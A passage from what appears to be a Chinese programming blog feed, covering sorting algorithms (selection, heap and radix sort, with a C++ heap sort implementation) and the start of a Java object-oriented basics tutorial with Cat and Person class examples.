一个算法执行所耗费的时间。</li><li><strong>空间复杂度</strong>：运行完一个程序所需内存的大小（辅助空间）。</li></ul><p><strong>关于稳定性</strong>：</p><p>稳定的排序算法：冒泡排序、插入排序、归并排序和基数排序。</p><p>不是稳定的排序算法：选择排序、快速排序、希尔排序、堆排序。</p><h2 id="选择排序分类">选择排序分类</h2><ul><li><p>简单选择排序</p></li><li><p>树型选择排序</p></li><li><p>堆排序</p></li></ul><h2 id="简单选择排序">简单选择排序</h2><h3 id="算法思想">算法思想</h3><p>对于具有 n 个记录的无序表遍历 n-1 次，第 i 次从无序表中第 i个记录开始，找出后序关键字中最小的记录，然后放置在第 i 的位置上。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311280906775.gif"alt="简单选择排序动图演示" /><figcaption aria-hidden="true">简单选择排序动图演示</figcaption></figure><h3 id="算法代码">算法代码</h3><h2 id="堆排序">堆排序</h2><h3 id="堆の概念">堆の概念</h3><p>首先要了解一下堆的含义：在含有 n个元素的序列中，如果序列中的元素满足下面其中一种关系时，此序列可以称之为堆。</p><ul><li><span class="math inline">\(k_i ≤ k_{2i}\)</span>且 <spanclass="math inline">\(k_i ≤ k_{2i+1}\)</span>（在 n 个记录的范围内，第<span class="math inline">\(i\)</span> 个关键字的值小于第 <spanclass="math inline">\(2i\)</span> 个关键字，同时也小于第 <spanclass="math inline">\(2i+1\)</span> 个关键字）</li><li><span class="math inline">\(k_i ≥ k_{2i}\)</span>且 <spanclass="math inline">\(k_i ≥ k_{2i+1}\)</span>（在 n 个记录的范围内，第<span class="math inline">\(i\)</span> 个关键字的值大于第 <spanclass="math inline">\(2i\)</span> 个关键字，同时也大于第 <spanclass="math inline">\(2i+1\)</span> 个关键字）</li></ul><p>对于堆的定义也可以使用完全二叉树来解释，因为在完全二叉树中第 i个结点的左孩子恰好是第 2i 个结点，右孩子恰好是 2i+1 个结点</p><p>如果该序列可以被称为堆，则使用该序列构建的完全二叉树中，每个根结点的值都必须不小于（或者不大于）左右孩子结点的值。</p><p>如果满足每个结点的值都<strong>大于</strong>其左孩子和右孩子结点的值，则是<strong>大根堆（大顶堆）</strong>；</p><p>如果满足每个结点的值都<strong>小于</strong>其左孩子和右孩子结点的值，则是<strong>小根堆（小顶堆）</strong>。</p><p>总结就是：</p><p>堆是一种特殊的树，只要满足下面两个条件，它就是一个堆：</p><p>（1）堆是一颗完全二叉树；</p><p>（2）堆中某个节点的值总是不大于（或不小于）其父节点的值。</p><h3 id="算法思想-1">算法思想</h3><p>通过将无序表转化为堆，可以直接找到表中最大值或者最小值，然后将其提取出来，令剩余的记录再重建一个堆，取出次大值或者次小值，如此反复执行就可以得到一个有序序列，此过程为<strong>堆排序</strong>。</p><p>以利用<strong>大根堆</strong>排序为例：</p><p>（1）首先将待排序列<spanclass="math inline">\(a[1…n]\)</span>调整为大根堆（此过程为建初堆），交换<spanclass="math inline">\(a[1]\)</span>和<spanclass="math inline">\(a[n]\)</span>，则<spanclass="math inline">\(a[n]\)</span>为关键字最大的记录</p><p>（2）将<spanclass="math inline">\(a[1…n-1]\)</span>重新调整为大根堆，交换<spanclass="math inline">\(a[1]\)</span>和<spanclass="math inline">\(a[n-1]\)</span>，则<spanclass="math inline">\(a[n-1]\)</span>为关键字次大的记录</p><p>（3）循环<span class="math inline">\(n-1\)</span>次，直到交换了<spanclass="math inline">\(a[1]\)</span>和<spanclass="math inline">\(a[2]\)</span>，得到一个非递减的有序序列<spanclass="math inline">\(a[1…n]\)</span></p><p>堆排序过程的代码实现需要解决两个问题：</p><ol type="1"><li>如何将得到的无序序列转化为一个堆？</li><li>在输出堆顶元素之后（完全二叉树的树根结点），如何调整剩余元素构建一个新的堆？</li></ol><p><strong>大根堆建堆</strong></p><p>①从最后一个分支结点开始，与其孩子结点的值比较。如果不符合特性，则交换；如果是大根堆，选择孩子结点中的较大值</p><p>② 交换之后如果孩子结点也是分支结点，继续向下比较；</p><p>③ 反复利用上述过程构造下一级的堆，直至根结点。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311281001541.gif"alt="大根堆建堆过程演示" /><figcaption aria-hidden="true">大根堆建堆过程演示</figcaption></figure><p><strong>如何调整剩余元素构建一个新的堆</strong></p><p>①输出堆顶元素后，将最后一个元素与之交换，此时堆的结构特性被破坏，需要向下筛选；</p><p>② 从上向下逐级比较，使每一级都符合特性。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311281007400.gif"alt="堆排序过程演示" /><figcaption aria-hidden="true">堆排序过程演示</figcaption></figure><h3 id="算法分析">算法分析</h3><p><strong>空间负责度</strong>：使用常数个辅助单元，空间复杂度为<spanclass="math inline">\(O(1)\)</span></p><p><strong>时间复杂度</strong>：建堆时间为<spanclass="math inline">\(O(n)\)</span>，之后有n-1次向下调整，调整操作的时间复杂度为<spanclass="math inline">\(O(h)\)</span>也就是<spanclass="math inline">\(O(log_2n)\)</span>，所以堆排序的时间复杂度为<spanclass="math inline">\(O(n*log_2n)\)</span>。</p><p><strong>稳定性</strong>：不稳定</p><p><strong>适用性</strong>：适用于线性表为顺序存储的情况，不能用于链式结构</p><p><strong>优点</strong>：初始建堆所需比较次数较多，因此对小文件效果不明显，但对大文件有效</p><p>堆排序在最坏情况下时间复杂度为<spanclass="math inline">\(O(n*log_2n)\)</span>，对于快速排序最坏情况下的<spanclass="math inline">\(O(n^2)\)</span>言是一个优点，当记录较多时较为高效</p><h3 id="算法代码-1">算法代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 100 <span class="hljs-comment">// 定义堆的最大长度</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-type">int</span> key; <span class="hljs-comment">// 关键字</span><br>&#125; ElemType;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    ElemType r[MAXSIZE]; <span class="hljs-comment">// 用于存储堆元素的数组</span><br>    <span class="hljs-type">int</span> length; <span class="hljs-comment">// 当前堆的长度</span><br>&#125; SqList;<br><br><span class="hljs-comment">// 函数声明</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">HeapAdjust</span><span class="hljs-params">(SqList &amp;H, <span class="hljs-type">int</span> s, <span class="hljs-type">int</span> m)</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">HeapSort</span><span class="hljs-params">(SqList &amp;H)</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">printArray</span><span class="hljs-params">(SqList &amp;H)</span></span>;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    SqList H;<br>    H.length = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// 初始化堆元素</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入堆的长度：&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;H.length);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入堆元素的关键字：&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= H.length; ++i) &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;H.r[i].key);<br>    &#125;<br><br>    <span class="hljs-comment">// 执行堆排序</span><br>    <span class="hljs-built_in">HeapSort</span>(H);<br><br>    <span class="hljs-comment">// 打印排序后的堆元素</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;堆排序后的结果：\n&quot;</span>);<br>    <span class="hljs-built_in">printArray</span>(H);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// 函数：对以s为根的子树进行堆调整，m为子树的长度</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">HeapAdjust</span><span class="hljs-params">(SqList &amp;H, <span class="hljs-type">int</span> s, <span class="hljs-type">int</span> m)</span> </span>&#123;<br>    ElemType rc = H.r[s]; <span class="hljs-comment">// 当前堆顶记录</span><br>    <span class="hljs-type">int</span> j;<br><br>    <span class="hljs-keyword">for</span> (j = <span class="hljs-number">2</span> * s; j &lt;= m; j *= <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-keyword">if</span> (j &lt; m &amp;&amp; H.r[j].key &lt; H.r[j + <span class="hljs-number">1</span>].key) &#123;<br>            ++j; <span class="hljs-comment">// j为key较大的儿子记录下标</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (!(rc.key &lt; H.r[j].key)) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        H.r[s] = H.r[j];<br>        s = j;<br>    &#125;<br>    H.r[s] = rc; <span class="hljs-comment">// 原堆顶记录交换到s位置</span><br>&#125;<br><br><span class="hljs-comment">// 函数：堆排序</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">HeapSort</span><span class="hljs-params">(SqList &amp;H)</span> </span>&#123;<br>    <span class="hljs-type">int</span> i;<br>    ElemType temp;<br><br>    <span class="hljs-comment">// 将H.r[1..H.length]建成大顶堆</span><br>    <span class="hljs-keyword">for</span> (i = H.length / <span class="hljs-number">2</span>; i &gt; <span class="hljs-number">0</span>; --i) &#123;<br>        <span class="hljs-built_in">HeapAdjust</span>(H, i, H.length);<br>    &#125;<br><br>    <span class="hljs-comment">// 将堆顶记录和当前子序列最后一个记录交换，然后重新调整为大顶堆</span><br>    <span class="hljs-keyword">for</span> (i = H.length; i &gt; <span class="hljs-number">1</span>; --i) &#123;<br>        temp = H.r[<span class="hljs-number">1</span>];<br>        H.r[<span class="hljs-number">1</span>] = H.r[i];<br>        H.r[i] = temp;<br>        <span class="hljs-built_in">HeapAdjust</span>(H, <span class="hljs-number">1</span>, i - <span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 函数：打印数组</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">printArray</span><span class="hljs-params">(SqList &amp;H)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= H.length; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, H.r[i].key);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="基数排序">基数排序</h2><h3 id="算法思想-2">算法思想</h3><p>基数排序是一种很特别的排序，它<strong>不基于比较和移动</strong>，而是<strong>基于各个位上关键字的大小进行排序</strong>。</p><p>假设长度为n的线性表由d元组<span class="math inline">\((k_{d-1},k_{d-2}, …, k_1, k_0)\)</span>组成，其中<spanclass="math inline">\(k_{d-1}\)</span>为最主位关键字，<spanclass="math inline">\(k_0\)</span>为最次位关键字。</p><p>关键字排序有两种方法：</p><p>①最高位优先法(MSD)：按关键字权重递减依次逐层划分成子序列，然后依次连接成有序序列。</p><p>②最低位优先法(LSD)：按关键字权重递增依次逐层划分成子序列，然后依次连接成有序序列。</p><blockquote><p>MSD( Most Significant Digit ) LSD ( Least Significant Digit )</p></blockquote><p><em>由于整数也可以表达字符串（比如名字或日期）和特定格式的浮点数，所以基数排序也不是只能使用于整数。</em></p><p><strong>LSD 基数排序动图演示</strong></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312010907103.gif"alt="LSD 基数排序动图演示" /><figcaption aria-hidden="true">LSD 基数排序动图演示</figcaption></figure><h3 id="算法分析-1">算法分析</h3><h3 id="代码实现">代码实现</h3><blockquote><p>参考：</p><p><ahref="https://www.runoob.com/w3cnote/ten-sorting-algorithm.html">1.0十大经典排序算法 | 菜鸟教程 (runoob.com)</a></p><p><ahref="https://github.com/hustcc/JS-Sorting-Algorithm/tree/master">hustcc/JS-Sorting-Algorithm:一本关于排序算法的 GitBook 在线书籍 《十大经典排序算法》，多语言实现。(github.com)</a></p><p><ahref="https://developer.aliyun.com/article/1295236">数据结构各内部排序算法总结对比及动图演示（插入排序、冒泡和快速排序、选择排序、堆排序、归并排序和基数排序等）2-阿里云开发者社区(aliyun.com)</a></p><p><ahref="https://blog.csdn.net/qq_44807176/article/details/118661354">【数据结构】内部排序-CSDN博客</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>数据结构</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>&lt;Java&gt; 6 面向对象编程（基础）</title>
    <link href="/2023/11/25/Java%206%20%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B%EF%BC%88%E5%9F%BA%E7%A1%80%EF%BC%89/"/>
    <url>/2023/11/25/Java%206%20%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B%EF%BC%88%E5%9F%BA%E7%A1%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<blockquote><p>面向对象是一种开发软件的方法，使分析、设计和实现一个系统的方法尽可能接近人们认识一个系统的方法。包括三个方面：面向对象分析、面向对象设计、面向对象程序设计。</p><p>Java语言是纯面向对象的语言。其所有数据类型都有相应的类，程序可以完全基于对象编写。</p></blockquote><h2 id="类与对象oop">6.1 类与对象（OOP）</h2><blockquote><p>类 就是数据类型。可以是 <code>int</code> 也可以是<code>人类</code></p><p>对象 就是其中具体的实例。可以是 <code>100</code> 也可以是<code>顶真</code></p><p>从类到对象，可以称为 创建一个对象，也可以说 实例化一个对象，或者把对象实例化</p><ol type="1"><li>类是抽象的、概念的，代表一类事物</li><li>对象是具体的、实际的，代表一个个具体事物，即是实例</li><li>类是对象的模板，对象是类的一个个体，对应一个实例</li></ol></blockquote><h3 id="类与对象引出">6.1.1 类与对象引出</h3><p><strong>6.1.1 看一个养猫猫问题</strong></p><p>张老太养了两只猫猫：一只名字叫小白，今年 3岁，白色。还有一只叫小花，今年 100岁，花色。请编写一个程序，当用户输入小猫的名字时，就显示该猫的名字，年龄，颜色。如果用户输入的小猫名错误，则显示张老太没有这只猫猫。</p><p><strong>6.1.2 使用现有技术解决 Object01.java</strong></p><ol type="1"><li>单独的定义变量解决</li><li>使用数组解决</li></ol><p><strong>6.1.3 现有技术解决的缺点分析</strong></p><p>不利于数据的管理</p><p>效率低 ===&gt; 引出我们的新知识点 类与对象</p><p>java 设计者 引入 类与对象(OOP)，根本原因就是现有的技术，不能完美的解决新的新的需求.</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311251759724.png"alt="image-20231125175919546" /><figcaption aria-hidden="true">image-20231125175919546</figcaption></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-comment">//使用 OOP 面向对象解决上述问题</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-comment">//编写一个 main 方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>       <br>        <span class="hljs-comment">//实例化一只猫[创建一只猫对象]</span><br>        <span class="hljs-comment">//1. new Cat() 创建一只猫(猫对象)</span><br>        <span class="hljs-comment">//2. Cat cat1 = new Cat(); 把创建的猫赋给 cat1</span><br>        <span class="hljs-comment">//3. cat1 就是一个对象</span><br>        <span class="hljs-type">Cat</span> <span class="hljs-variable">cat1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>();<br>        cat1.name = <span class="hljs-string">&quot;小白&quot;</span>;<br>        cat1.age = <span class="hljs-number">3</span>;<br>        cat1.color = <span class="hljs-string">&quot;白色&quot;</span>;<br>        cat1.weight = <span class="hljs-number">10</span>;<br>        <span class="hljs-comment">//创建了第二只猫，并赋给 cat2</span><br>        <span class="hljs-comment">//cat2 也是一个对象(猫对象)</span><br>        <span class="hljs-type">Cat</span> <span class="hljs-variable">cat2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>();<br>        cat2.name = <span class="hljs-string">&quot;小花&quot;</span>;<br>        cat2.age = <span class="hljs-number">100</span>;<br>        cat2.color = <span class="hljs-string">&quot;花色&quot;</span>;<br>        cat2.weight = <span class="hljs-number">20</span>;<br>        <span class="hljs-comment">//怎么访问对象的属性呢</span><br>        System.out.println(<span class="hljs-string">&quot;第 1 只猫信息: &quot;</span> + cat1.name<br>                + <span class="hljs-string">&quot; &quot;</span> + cat1.age + <span class="hljs-string">&quot; &quot;</span> + cat1.color + <span class="hljs-string">&quot; &quot;</span> + cat1.weight);<br>        System.out.println(<span class="hljs-string">&quot;第 2 只猫信息: &quot;</span> + cat2.name<br>                + <span class="hljs-string">&quot; &quot;</span> + cat2.age + <span class="hljs-string">&quot; &quot;</span> + cat2.color + <span class="hljs-string">&quot; &quot;</span> + cat2.weight);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-comment">//定义一个猫类 Cat -&gt; 自定义的数据类型</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span> &#123;<br>    <span class="hljs-comment">//属性/成员变量</span><br>    String name; <span class="hljs-comment">//名字</span><br>    <span class="hljs-type">int</span> age; <span class="hljs-comment">//年龄</span><br>    String color; <span class="hljs-comment">//颜色</span><br>    <span class="hljs-type">double</span> weight; <span class="hljs-comment">//体重</span><br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="对象内存布局">6.1.2 对象内存布局</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311251814354.png"alt="image-20231125181407271" /><figcaption aria-hidden="true">image-20231125181407271</figcaption></figure><h3 id="属性成员变量">6.1.3 属性/成员变量</h3><blockquote><p>从概念或叫法上看：成员变量 = 属性 = field（字段）</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span>&#123;<br>String name;<br><span class="hljs-type">int</span> age;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中，<code>String name;</code> 就是一个成员变量（属性）。</p><p>属性是类的一个组成部分，一般是基本数据类型，也可以是引用数据类型（对象，数组）。</p><ol type="1"><li><p>属性的定义语法同变量。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">访问修饰符 属性类型 属性名<br></code></pre></td></tr></table></figure><p>访问修饰符：控制属性的访问范围。有四种：<code>public</code>，<code>protected</code>， <code>默认(空)</code>，<code>private</code></p></li><li><p>属性的定义类型可以为任意类型，包含基本类型或引用类型</p></li><li><p>属性如果不赋值，有默认值。规则同数组</p></li></ol><h3 id="创建对象">6.1.4 创建对象</h3><ul><li><p>先声明再创建：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JAVA">Cat cat1;      <span class="hljs-comment">//声明对象cat1</span><br>cat1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>();<span class="hljs-comment">//创建对象，new会开空间</span><br></code></pre></td></tr></table></figure></li><li><p>直接创建：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-type">Cat</span> <span class="hljs-variable">cat2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>();<br></code></pre></td></tr></table></figure></li></ul><p>注意事项：</p><ol type="1"><li><p>声明对象时，只是在内存中建立了一个引用。此时，该地址引用不指向任何内存空间（NULL）。对象的引用，也被称为对象的句柄。</p></li><li><p>使用 new运算符创建对象实例时，会为对象分配空间。之后，会将该段内存的首地址赋给刚才建立的引用。</p></li></ol><h3 id="访问对象">6.1.5 访问对象</h3><p>基本语法：<code>对象名.属性名</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JAVA">System.out.println(cat1.name);<br></code></pre></td></tr></table></figure><h3 id="类与对象的内存分配机制">6.1.6 类与对象的内存分配机制</h3><blockquote><p>Java内存的结构分析</p><p>栈：一般存放基本数据类型（局部变量）</p><p>堆：存放对象（如<code>Cat cat1 = new Cat()</code>，是在这里开辟的空间）</p><p>方法区：常量池（常量，比如字符串），类加载信息</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>p.name = “jack”;<br>p.age = <span class="hljs-number">10</span>;<br></code></pre></td></tr></table></figure><ol type="1"><li><p>先加载 Person 类信息(属性和方法信息，只会加载一次)</p></li><li><p>在堆中分配空间，进行默认初始化(看规则)</p></li><li><p>把地址赋给 p , p 就指向对象</p></li><li><p>进行指定初始化， 比如 <code>p.name =”jack”</code>，<code>p.age = 10</code></p></li></ol><h2 id="成员方法">6.2 成员方法</h2><p>在某些情况下，我们要需要定义成员方法(简称方法)。比如人类：除了有一些属性外(年龄，姓名……)，我们人类还有一些行为，比如：可以说话、跑步..，通过学习，还可以做算术题。这时就要用<strong>成员方法</strong>才能完成。现在要求对Person 类完善。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//初步认识的例子</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//方法使用</span><br>        <span class="hljs-comment">//1. 方法写好后，如果不去调用(使用)，不会输出</span><br>        <span class="hljs-comment">//2. 先创建对象 ,然后调用方法即可</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        p1.speak(); <span class="hljs-comment">//调用方法</span><br>        p1.cal01(); <span class="hljs-comment">//调用 cal01 方法</span><br>        p1.cal02(<span class="hljs-number">5</span>); <span class="hljs-comment">//调用 cal02 方法，同时给 n = 5</span><br>        p1.cal02(<span class="hljs-number">10</span>); <span class="hljs-comment">//调用 cal02 方法，同时给 n = 10</span><br>        <span class="hljs-comment">//调用 getSum 方法，同时 num1=10, num2=20</span><br>        <span class="hljs-comment">//把 方法 getSum 返回的值，赋给 变量 returnRes</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">returnRes</span> <span class="hljs-operator">=</span> p1.getSum(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>);<br>        System.out.println(<span class="hljs-string">&quot;getSum 方法返回的值=&quot;</span> + returnRes);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    String name;<br>    <span class="hljs-type">int</span> age;<br>    <span class="hljs-comment">//方法(成员方法)</span><br>    <span class="hljs-comment">//添加 speak 成员方法,输出 “我是一个好人”</span><br>    <span class="hljs-comment">//1. public 表示方法是公开</span><br>    <span class="hljs-comment">//2. void ： 表示方法没有返回值</span><br>    <span class="hljs-comment">//3. speak() : speak 是方法名， () 形参列表，目前是空</span><br>    <span class="hljs-comment">//4. &#123;&#125; 方法体，可以写我们要执行的代码</span><br>    <span class="hljs-comment">//5. System.out.println(&quot;我是一个好人&quot;); 表示我们的方法就是输出一句话</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">speak</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;我是一个好人&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//添加 cal01 成员方法,可以计算从 1+..+1000 的结果</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cal01</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">1000</span>; i++) &#123;<br>            res += i;<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;cal01 方法 计算结果=&quot;</span> + res);<br>    &#125;<br><br>    <span class="hljs-comment">//添加 cal02 成员方法,该方法可以接收一个数 n，计算从 1+..+n 的结果</span><br>    <span class="hljs-comment">//1. (int n) 形参列表， 表示当前有一个形参 n, 可以接收用户输入</span><br>    <span 